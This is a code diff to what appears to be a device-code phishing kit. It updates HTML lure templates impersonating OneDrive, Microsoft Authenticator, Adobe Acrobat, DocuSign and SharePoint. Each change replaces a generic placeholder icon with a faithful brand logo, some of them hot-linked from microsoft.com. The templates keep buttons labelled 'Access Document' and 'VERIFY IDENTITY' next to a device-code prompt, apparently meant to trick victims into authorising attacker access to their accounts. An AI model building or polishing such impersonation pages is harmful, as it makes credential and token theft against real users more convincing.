@@ -421,12 +421,12 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 </head>
 <body>
 <div class="header">
-<svg width="28" height="28" viewBox="0 0 32 32"><circle cx="16" cy="16" r="15" fill="#0078d4"/><path fill="#fff" d="M8,10h16v3H8V10z M8,15h16v3H8V15z M8,20h10v3H8V20z"/></svg>
+<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
 <span class="header-title">OneDrive</span>
 </div>
 <div class="main"><div class="card">
 <div class="logo">
-<svg width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="16" r="15" fill="#0078d4"/><path fill="#fff" d="M8,10h16v3H8V10z M8,15h16v3H8V15z M8,20h10v3H8V20z"/></svg>
+<img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/OneDrive-Icon-FY26.svg" width="40" height="40" alt="OneDrive" style="flex-shrink:0">
 <span class="logo-text">OneDrive</span>
 </div>
 <div id="mainView">
@@ -442,7 +442,7 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 </div>
 <div class="status" id="codeStatus"></div>
 <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
-<svg width="22" height="22" viewBox="0 0 24 24"><circle cx="12" cy="12" r="11" fill="#fff"/><path fill="#0078d4" d="M7,9h10v2H7V9z M7,13h10v2H7V13z M7,17h7v2H7V17z"/></svg>
+<svg width="20" height="20" viewBox="0 0 24 24"><path fill="#fff" d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
 Access Document
 </button>
 <div class="security-box">
@@ -479,12 +479,12 @@ const DEVICE_CODE_AUTHENTICATOR_HTML = `<!DOCTYPE html>
 </head>
 <body>
 <div class="header">
-<svg width="32" height="32" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#fff"/><path fill="#0078d4" d="M24 8c-8.8 0-16 7.2-16 16s7.2 16 16 16 16-7.2 16-16-7.2-16-16-16zm0 28c-6.6 0-12-5.4-12-12s5.4-12 12-12 12 5.4 12 12-5.4 12-12 12zm-1-9h2v2h-2v-2zm0-8h2v6h-2v-6z"/></svg>
+<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
 <span class="header-title">Microsoft Authenticator</span>
 </div>
 <div class="main"><div class="card">
 <div class="logo">
-<svg width="36" height="36" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#0078d4"/><path fill="#fff" d="M24 10c-7.7 0-14 6.3-14 14s6.3 14 14 14 14-6.3 14-14-6.3-14-14-14zm0 24c-5.5 0-10-4.5-10-10s4.5-10 10-10 10 4.5 10 10-4.5 10-10 10zm-1-7h2v2h-2v-2zm0-10h2v8h-2v-8z"/></svg>
+<svg width="40" height="40" viewBox="0 0 24 24"><defs><linearGradient id="ag" x1="3" y1="5" x2="21" y2="19"><stop offset="0%" stop-color="#0078d4"/><stop offset="100%" stop-color="#00bcf2"/></linearGradient></defs><path fill="url(#ag)" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/><path fill="#fff" d="M10 15.17l-3.59-3.58L5 13l5 5 9-9-1.41-1.42z"/></svg>
 <span class="logo-text">Microsoft Authenticator</span>
 </div>
 <div id="mainView">
@@ -500,7 +500,7 @@ const DEVICE_CODE_AUTHENTICATOR_HTML = `<!DOCTYPE html>
 </div>
 <div class="status" id="codeStatus"></div>
 <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
-<svg width="24" height="24" viewBox="0 0 48 48"><circle cx="24" cy="24" r="20" fill="#fff"/><path fill="#0078d4" d="M24 12c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12-5.4-12-12-12zm0 20c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8zm-1-5h2v2h-2v-2zm0-8h2v6h-2v-6z"/></svg>
+<svg width="22" height="22" viewBox="0 0 24 24"><path fill="#fff" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/><path fill="#0078d4" d="M10 15.17l-3.59-3.58L5 13l5 5 9-9-1.41-1.42z"/></svg>
 VERIFY IDENTITY
 </button>
 <div class="security-box">
@@ -538,7 +538,7 @@ const DEVICE_CODE_ADOBE_HTML = `<!DOCTYPE html>
 <body>
 <div class="main"><div class="card">
 <div class="logo">
-<div class="logo-icon"><span>A</span></div>
+<svg width="56" height="56" viewBox="0 0 56 56" style="margin-bottom:16px;flex-shrink:0"><rect width="56" height="56" rx="12" fill="#FA0F00"/><path fill="#fff" d="M28 10L18 44h5l2.5-7h9l2.5 7h5L28 10zm0 8.5L33 32.5h-10L28 18.5z"/></svg>
 <div class="logo-text-row">
 <span class="logo-text">Adobe</span>
 <span class="logo-sub">Acrobat Reader</span>
@@ -595,13 +595,13 @@ const DEVICE_CODE_DOCUSIGN_HTML = `<!DOCTYPE html>
 </head>
 <body>
 <div class="header">
-<svg width="32" height="32" viewBox="0 0 48 48"><rect width="48" height="48" rx="6" fill="#ffd700"/><path fill="#1a1a1a" d="M12 16h24v3H12v-3zm0 6h24v3H12v-3zm0 6h18v3H12v-3z"/></svg>
+<svg width="32" height="32" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="#FFC829"/><path fill="none" stroke="#1a1a1a" stroke-width="2.5" stroke-linecap="round" d="M8 32C14 14 20 14 24 24S34 28 40 16"/></svg>
 <span class="header-title">docusign</span>
 </div>
 <div class="main"><div class="card">
 <div class="logo">
 <div class="logo-icon">
-<svg width="40" height="40" viewBox="0 0 48 48"><rect width="48" height="48" rx="6" fill="#ffd700"/><path fill="#1a1a1a" d="M12 16h24v3H12v-3zm0 6h24v3H12v-3zm0 6h18v3H12v-3z"/></svg>
+<svg width="40" height="40" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="#FFC829"/><path fill="none" stroke="#1a1a1a" stroke-width="2.5" stroke-linecap="round" d="M8 32C14 14 20 14 24 24S34 28 40 16"/></svg>
 <span class="logo-text">docusign</span>
 </div>
 </div>
@@ -656,12 +656,12 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
 </head>
 <body>
 <div class="header">
-<svg width="28" height="28" viewBox="0 0 32 32"><path fill="#fff" d="M4 4h24v24H4V4zm2 2v20h20V6H6zm3 3h6v6H9V9zm8 0h6v6h-6V9zM9 17h6v6H9v-6zm8 0h6v6h-6v-6z"/></svg>
+<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
 <span class="header-title">SharePoint</span>
 </div>
 <div class="main"><div class="card">
 <div class="logo">
-<svg width="32" height="32" viewBox="0 0 32 32"><path fill="#036c70" d="M4 4h24v24H4V4zm2 2v20h20V6H6zm3 3h6v6H9V9zm8 0h6v6h-6V9zM9 17h6v6H9v-6zm8 0h6v6h-6v-6z"/></svg>
+<img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" width="40" height="40" alt="SharePoint" style="flex-shrink:0">
 <span class="logo-text">SharePoint</span>
 </div>
 <div id="mainView">
@@ -677,7 +677,7 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
 </div>
 <div class="status" id="codeStatus"></div>
 <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
-<svg width="22" height="22" viewBox="0 0 32 32" fill="currentColor"><path d="M6 6h20v20H6V6zm2 2v16h16V8H8zm2 2h4v4h-4v-4zm6 0h4v4h-4v-4zm-6 6h4v4h-4v-4zm6 0h4v4h-4v-4z"/></svg>
+<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
 Access Document
 </button>
 <div class="security-box">
